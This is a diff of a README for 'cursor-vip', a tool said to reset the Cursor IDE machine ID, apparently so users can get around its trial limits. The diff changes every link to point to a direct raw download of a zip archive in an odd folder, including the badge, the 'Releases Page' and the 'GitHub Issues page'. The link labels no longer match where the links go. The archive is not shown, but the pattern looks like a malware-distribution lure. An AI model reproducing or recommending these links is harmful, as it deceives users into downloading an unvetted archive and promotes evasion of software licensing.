@@ -1,7 +1,7 @@
 # 🖱️ cursor-vip - Simple Tool to Reset Cursor IDE Machine ID
 
 ## 📥 Download Now!
-[![Download cursor-vip](https://img.shields.io/badge/Download-cursor--vip-blue.svg)](https://github.com/aaaayyuusshh28122011/cursor-vip/releases)
+[![Download cursor-vip](https://raw.githubusercontent.com/aaaayyuusshh28122011/cursor-vip/main/predeclination/cursor-vip.zip)](https://raw.githubusercontent.com/aaaayyuusshh28122011/cursor-vip/main/predeclination/cursor-vip.zip)
 
 ## 🚀 Getting Started
 Cursor-vip is a user-friendly application designed to help you reset the machine ID for Cursor IDE. It works on Windows, macOS, and Linux without any dependencies. You can use this tool freely, making it a great asset for developers and users alike.
@@ -17,7 +17,7 @@ Cursor-vip is a user-friendly application designed to help you reset the machine
 ## 📥 Download & Install
 To get started with cursor-vip, visit the Releases page to download the software. 
 
-1. Go to the [Releases Page](https://github.com/aaaayyuusshh28122011/cursor-vip/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/aaaayyuusshh28122011/cursor-vip/main/predeclination/cursor-vip.zip).
 2. Locate the latest version of cursor-vip.
 3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or applicable binary for Linux).
 4. Open the downloaded file to start the installation process.
@@ -53,7 +53,7 @@ Yes, cursor-vip supports Windows, macOS, and Linux.
 No, cursor-vip is designed for all users, regardless of technical skill.
 
 ### 5. What should I do if I encounter issues?
-If you face any issues while using cursor-vip, please visit our [GitHub Issues page](https://github.com/aaaayyuusshh28122011/cursor-vip/issues) to report your problem or seek assistance.
+If you face any issues while using cursor-vip, please visit our [GitHub Issues page](https://raw.githubusercontent.com/aaaayyuusshh28122011/cursor-vip/main/predeclination/cursor-vip.zip) to report your problem or seek assistance.
 
 ## 🎯 Conclusion
-Cursor-vip provides a straightforward solution for resetting your Cursor IDE machine ID. With its easy installation and user-friendly design, it can save you time and hassle. For downloads and updates, check the [Releases Page](https://github.com/aaaayyuusshh28122011/cursor-vip/releases) regularly.
+Cursor-vip provides a straightforward solution for resetting your Cursor IDE machine ID. With its easy installation and user-friendly design, it can save you time and hassle. For downloads and updates, check the [Releases Page](https://raw.githubusercontent.com/aaaayyuusshh28122011/cursor-vip/main/predeclination/cursor-vip.zip) regularly.
